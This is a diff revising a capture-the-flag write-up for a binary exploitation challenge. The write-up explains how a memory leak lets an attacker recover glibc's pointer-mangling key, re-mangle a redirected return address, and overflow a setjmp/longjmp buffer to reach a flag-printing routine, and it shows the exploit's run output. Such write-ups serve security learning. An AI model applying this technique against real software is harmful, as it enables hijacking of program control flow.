@@ -106,16 +106,16 @@ Let's write a little pwntools script to display it! (properly)
 ```
 ...
 Here, get a cookie! Yum Yum! :-)
-leak: b'\x08\xec\x80"\xfc\x7f\x00\x00o\x8b?j\xbeDT\xb4\x00\x00\x00\x00\x00\x00\x00\x00\x18\xec\x80"\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x10I\xd0\xf8\x7f\x00\x00o\x8b\x7fl\xbeDT\xb4o\x8b\xe1y|\xceL\xe1'
+leak: b'\xf8$S\x90\xfd\x7f\x00\x00\x1az\x81*h\xfd]*\x00\x00\x00\x00\x00\x00\x00\x00\x08%S\x90\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@d\x06\xd8\x7f\x00\x00\x1az\xc1(h\xfd]*\x1az\x7f\x0bRm\xa7~'
 addresses:
-0x7ffc2280ec08
-0xb45444be6a3f8b6f
+0x7ffd905324f8
+0x2a5dfd682a817a1a
 0x0
-0x7ffc2280ec18
+0x7ffd90532508
 0x0
-0x7ff8d0491020
-0xb45444be6c7f8b6f
-0xe14cce7c79e18b6f
+0x7fd806644000
+0x2a5dfd6828c17a1a
+0x7ea76d520b7f7a1a
 ```
 > Note: this is what it looks like in local not in remote, you'll see later that this is important
 
@@ -240,28 +240,85 @@ And that's perfect because it is exactly what was missing for recovering the who
 Here is a little schema to understand it (we ignore the bitwise rotation here)
 ```
 we'll use:
+
 rbp_mangled = rbp XOR key 
+so:
 key = rbp_mangled XOR rbp
-key_truncated|garbage = rbp_mangled XOR rbp_truncated|garbage
+then:
+key_truncated = rbp_mangled XOR rbp_truncated
+
 but remember: rbx is close to rbp so:
 rbp_truncated = rbx_truncated 
 and we know plain rbx!
 
-LEAKED STACK: 0x 00 00 7f fc 22 80 eX XX (truncated)
-RBP MANGLED : 0x b4 54 44 be 6a 3f 8b 6f
-PARTIAL KEY :                       X XX 
+simplified version with 8 bits (real addresses are 8 bytes)
+LEAKED STACK: 1 0 0 1 1 0 X X (rbx truncated)
+RBP MANGLED : 0 1 0 0 1 0 1 0
+PARTIAL KEY : 1 1 0 1 0 0 X X --> we recovered part of the key!
 
+we apply the same technic with the end of the key:
+KNOWN RIP   : X X X X X X 0 1
+RIP MANGLED : 1 1 0 1 0 0 1 1
+PARTIAL KEY2: X X X X X X 1 0
 
-
-
-COMPLETE KEY: 0x d5 8c 98 36 12 e8 a8 1f
+and then we got the full key:
+KEY = PARTIAL KEY|PARTIAL KEY2 (concat after truncating the garbage parts)
 ```
-
 And just like that we can guess the key used and then demangle properly rip!
 
-We can recover rip, adds the delta to make it points to the beginning of the section that prints the flag (remember at the beginning when reversing we noticed this weird 42 option in the switch case that prints the flag)
-the we re-mangle the new computed rip, modifies the cookie, add the perfect padding and use the overflow we previously detected!
-and that works! we get the flag!
+We can recover rip, add the delta to make it points to the beginning of the section that prints the flag (remember at the beginning when reversing we noticed this weird 42 option in the switch case that prints the flag):
+```
+end of rip = 0x131f
+start of flag section = 0x1595
+
+delta = 0x1595 - 0x131f = 630
+
+new_rip = rip_demangled + 630
+```
+The we re-mangle the new rip with `rol(<ptr> XOR key, 17 bits)`, modify the cookie, add the perfect padding (0x20 character in the case of the username input) and use the overflow we previously detected!  
+That way we perfectly overwrite the `env` struct that is passed to `longjmp`, it reads it normally and demangle our crafted rip then jumps to the 42 option in the switch and...
+```
+Here, get a cookie! Yum Yum! :-)
+leak: b'\xf8$S\x90\xfd\x7f\x00\x00\x1az\x81*h\xfd]*\x00\x00\x00\x00\x00\x00\x00\x00\x08%S\x90\xfd\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@d\x06\xd8\x7f\x00\x00\x1az\xc1(h\xfd]*\x1az\x7f\x0bRm\xa7~'
+addresses:
+0x7ffd905324f8
+0x2a5dfd682a817a1a
+0x0
+0x7ffd90532508
+0x0
+0x7fd806644000
+0x2a5dfd6828c17a1a
+0x7ea76d520b7f7a1a
+1: Log in
+2: Get cookie
+3: Logout
+0: Exit
+>>
+key_start/key_end: bd0d6ad36ee731b8 bd0d3f53b6a916a0
+key: 0xbd0d6ad36ee736a0
+inject new rip b'\x955N\xd8\x80U\x00\x00' at 0x38 in the cookie
+new cookie is:
+addresses:
+0x7ffd905324f8
+0x2a5dfd682a817a1a
+0x0
+0x7ffd90532508
+0x0
+0x7fd806644000
+0x2a5dfd6828c17a1a
+0x7ea76d52066b7a1a
+Bye bye o/
+1: Log in
+0: Exit
+>>
+Login:
+>>
+Password:
+>>
+Wrong password!
+FCSC{FAKE_FLAG}
+```
+that works! we get the flag!
 
 ## Post Scriptums and mea culpa
 PS: I got very lucky because on remote the leak looks like:
@@ -275,9 +332,10 @@ PS: I got very lucky because on remote the leak looks like:
 0xf810053be157ca87
 0x16ea2df3e3a9ca87
 ```
-the stack is not leaked! OFC because this piece of code is heavily platform-dependant and the libc is probably not the same that mine  
-luckily for me I don't need to guess the whole key, because even if I don't know the real stack adress I don't need it, only the 3 last hexa character must be changed  
-then what I took for the stack leak (0x0) will give me the wrong secret key but because I'll change only the last 3 hexa charcacters and directly re-encrypt the address in the payload it will be transparent, tks to X ^ X ^ A = A and the fact that the mangling isn't chaining the bytes but done byte by byte (this is similar to the AES-ECB vulnerability known is cryptography).
-A big tks to [GammaRay99](https://github.com/GammaRay99/CTF-WRITEUPS/tree/main/FCSC2023/pwn/pterodactyle) for making me understand a mistake I didn't even saw!
+The stack is not leaked! OFC because the libc is probably not the same that mine so rbx and other registers probably don't store the same values when `setjmp` is called!
 
-**PPS:** as already discussed, randomly the exploit can fail because of ASLR poorly randomizing the stack start given us only 12 valid hexa character in common between rbx and rbp and the crashing the program with sigsegv, but trying it a few time it will work!
+Luckily for me I don't need to guess the whole key, because even if I don't know the real stack adress I don't need it, only the 3 last hexa character must be changed  
+Then what I took for the stack leak (0x0) will give me the wrong secret key but because I'll change only the last 3 hexa charcacters and directly re-encrypt the address in the payload it will be transparent:  
+Tks to X ^ X ^ A = A and the fact that the mangling isn't chaining the bytes but done byte by byte.
+
+A big tks to [GammaRay99](https://github.com/GammaRay99/CTF-WRITEUPS/tree/main/FCSC2023/pwn/pterodactyle) for making me understand a mistake I didn't even saw!
